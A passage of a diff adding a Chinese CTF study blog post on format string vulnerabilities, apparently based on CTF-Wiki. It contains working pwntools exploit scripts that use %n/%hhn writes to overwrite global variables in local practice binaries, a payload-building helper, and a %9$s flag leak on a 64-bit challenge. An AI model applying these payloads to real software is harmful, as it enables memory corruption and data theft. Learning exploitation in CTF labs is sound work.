class="hljs-built_in">hex</span>(c_addr)<br>payload = p32(c_addr) + <span class="hljs-string">&#x27;%012d&#x27;</span> + <span class="hljs-string">&#x27;%6$n&#x27;</span><br><span class="hljs-built_in">print</span> payload<br>gdb.attach(sh)<br>sh.sendline(payload)<br><span class="hljs-built_in">print</span> sh.recv()<br>sh.interactive()<br></code></pre></div></td></tr></table></figure>
+
+<p>看到结果已经成功输出了当C=16时的字符串。</p>
+<p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/10.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h3><h4 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h4><p>现在来考虑一下如何修改<code>data</code>段的变量，将其修改为一个较小的数字，比如说小于机器字长的数字，比如说2。根据前面的例子，我们知道，前面是地址，而这个地址最少都是四字节（32位），所以无论如何都不会小于四字节。</p>
+<p>现在就需要重新构建一下payload，可以把地址放在中间，而不需要将其放在最前面，只要能够找到对应的偏移量，也是可以得到对应的数值。刚才那个程序，我们已经分析过格式化字符串是第六个参数，要将2写到指定位置的话，那么地址不能放在前面，前面可以放两个字节任意字符，<code>XX%n</code>，此时这已经是第六个参数，然后是<code>$xXX</code>，这就是第七个参数，最后就是地址，也就是第八个参数，那么此时的payload就可以是以下的形式</p>
+<figure class="highlight mel"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mel">XX%8$nXX[addr]<br></code></pre></div></td></tr></table></figure>
+
+<p>现在尝试覆盖a的地址，因为a是一个已经初始过得全局变量，在IDA中可以直接看到地址。</p>
+<p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/11.png" srcset="/img/loading.gif" lazyload></p>
+<p>完整exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./overwrite&quot;</span>)<br>a_addr = <span class="hljs-number">0x804a024</span><br>payload = <span class="hljs-string">&quot;aa%8$naa&quot;</span> + p32(a_addr)<br>p.sendline(payload)<br><span class="hljs-built_in">print</span> p.recv()<br>p.interactive()<br></code></pre></div></td></tr></table></figure>
+
+<p>看到成功输出了a=2的信息。</p>
+<p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/12.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h4><p>刚才是覆盖小数字，现在来尝试覆盖大数字。首先来了解一下变量在内存中的存储格式。所有的变量在内存中都是以字节进行存储的，然后都是以小端序进行存储的。再来回忆一下格式化字符串里面的标志，发现有这样两个标志：</p>
+<ul>
+<li><code>hh</code>对于整数类型，<code>printf</code>期待一个从<code>char</code>提升的<code>int</code>尺寸的整型参数。</li>
+<li><code>h</code>对于整数类型，<code>printf</code>期待一个从<code>short</code>提升的<code>int</code>尺寸的整型参数。</li>
+</ul>
+<p>确定一下写入的地址，可以直接在IDA中看到，变量b的地址是<code>0x804A028</code>，此时想要的覆盖效果如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">0x0804A028</span>-&gt;<span class="hljs-number">0</span>x<span class="hljs-number">78</span><br><span class="hljs-attribute">0x0804A029</span>-&gt;<span class="hljs-number">0</span>x<span class="hljs-number">56</span><br><span class="hljs-attribute">0x0804A02a</span>-&gt;<span class="hljs-number">0</span>x<span class="hljs-number">34</span><br><span class="hljs-attribute">0x0804A02b</span>-&gt;<span class="hljs-number">0</span>x<span class="hljs-number">12</span><br></code></pre></div></td></tr></table></figure>
+
+<p>直接利用wiki中的模板进行计算</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt</span>(<span class="hljs-params">prev, word, index</span>):</span><br>    <span class="hljs-keyword">if</span> prev &lt; word:<br>        result = word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    <span class="hljs-keyword">elif</span> prev == word:<br>        result = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        result = <span class="hljs-number">256</span> + word - prev<br>        fmtstr = <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(result) + <span class="hljs-string">&quot;c&quot;</span><br>    fmtstr += <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;$hhn&quot;</span><br>    <span class="hljs-keyword">return</span> fmtstr<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_str</span>(<span class="hljs-params">offset, size, addr, target</span>):</span><br>    payload = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">if</span> size == <span class="hljs-number">4</span>:<br>            payload += p32(addr + i)<br>        <span class="hljs-keyword">else</span>:<br>            payload += p64(addr + i)<br>    prev = <span class="hljs-built_in">len</span>(payload)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        payload += fmt(prev, (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>, offset + i)<br>        prev = (target &gt;&gt; i * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> payload<br></code></pre></div></td></tr></table></figure>
+
+<p>完整的EXP如下</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forb</span>():</span><br>    sh = process(<span class="hljs-string">&#x27;./overwrite&#x27;</span>)<br>    payload = fmt_str(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x0804A028</span>, <span class="hljs-number">0x12345678</span>)<br>    <span class="hljs-built_in">print</span> payload<br>    sh.sendline(payload)<br>    <span class="hljs-built_in">print</span> sh.recv()<br>    sh.interactive()<br></code></pre></div></td></tr></table></figure>
+
+<p>成功输出对应信息</p>
+<p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/13.png" srcset="/img/loading.gif" lazyload></p>
+<p>了解到在<code>pwntools</code>中还有工具<code>fmtstr_payload</code>，可以直接拿来进行计算。</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">p</span> = process(<span class="hljs-string">&quot;./overwrite&quot;</span>)<br><span class="hljs-attribute">payload</span> = fmtstr_payload(<span class="hljs-number">6</span>,&#123;<span class="hljs-number">0</span>x<span class="hljs-number">804</span>A<span class="hljs-number">028</span>:<span class="hljs-number">0</span>x<span class="hljs-number">12345678</span>&#125;)<br><span class="hljs-attribute">print</span> payload<br><span class="hljs-attribute">p</span>.sendline(payload)<br><span class="hljs-attribute">p</span>.interactive()<br></code></pre></div></td></tr></table></figure>
+
+<p>其中第一个参数为偏移，第二个表示写入的数据，数据地址，以及要写入的信息。</p>
+<p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/14.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="64位程序格式化字符串漏洞"><a href="#64位程序格式化字符串漏洞" class="headerlink" title="64位程序格式化字符串漏洞"></a>64位程序格式化字符串漏洞</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>对于64位的程序与32位的偏移计算是类似的，只不过64位函数的前6个参数是存储在相应的寄存器中的。而对于漏洞，程序依旧会按照格式化字符串相应格式对其进行解析。</p>
+<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>例题<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck">pwn200 GoodLuck</a></p>
+<p>查看一下保护机制</p>
+<p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/15.png" srcset="/img/loading.gif" lazyload></p>
+<p>分析程序，看到漏洞点</p>
+<p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/16.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用gdb调试程序，断在<code>printf</code>之前，看到此时的找情况，我们想要的<code>flag</code>在第四个位置，然后这是一个64位的程序，对应的前六个参数都会存在寄存器之中，加上这个偏移量就是10，然后还有一个格式化字符串，作为它的参数，偏移量就是9。所以输入<code>%9$s</code>即可。</p>
+<p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/17.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/18.png" srcset="/img/loading.gif" lazyload></p>
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh=process(<span class="hljs-string">&#x27;./goodluck&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;%9$s&#x27;</span>)<br><span class="hljs-built_in">print</span> sh.recv()<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>主要都是参考了CTF-WIKI中的内容，一些文字性的内容，也没有修改，都是直接写了wiki中的内容，感觉自己总结能力也比较差，很多东西写的没人家好，还有一些例子我并没有做，主要目前还不是很懂一些知识点，先挖个坑吧，等以后慢慢再回过头来学习。</p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/PWN/">PWN</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">格式化字符串</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/">
+                        <span class="hidden-mobile">Macro 4.0总结</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="waline"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#waline', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/@waline/client@0.16.2/dist/Waline.min.js', function() {
+        var options = Object.assign(
+          {"serverURL":"https://blog-api-brown.vercel.app/","path":"window.location.pathname","placeholder":"说点什么","meta":["nick","mail","link"],"requiredMeta":["nick"],"lang":"zh-CN","emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis/weibo"],"dark":"html[data-user-color-scheme=\"dark\"]","avatar":123,"avatarCDN":"","avatarForce":false,"wordLimit":0,"pageSize":10,"highlight":true,"requiredFields":[],"emojiCDN":null,"emojiMaps":null,"anonymous":null},
+          {
+            el: '#waline',
+            path: window.location.pathname
+          }
+        )
+        new Waline(options);
+        Fluid.utils.waitElementVisible('#waline .vcontent', () => {
+          Fluid.plugins.initFancyBox('#waline .vcontent img:not(.vemoji)');
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
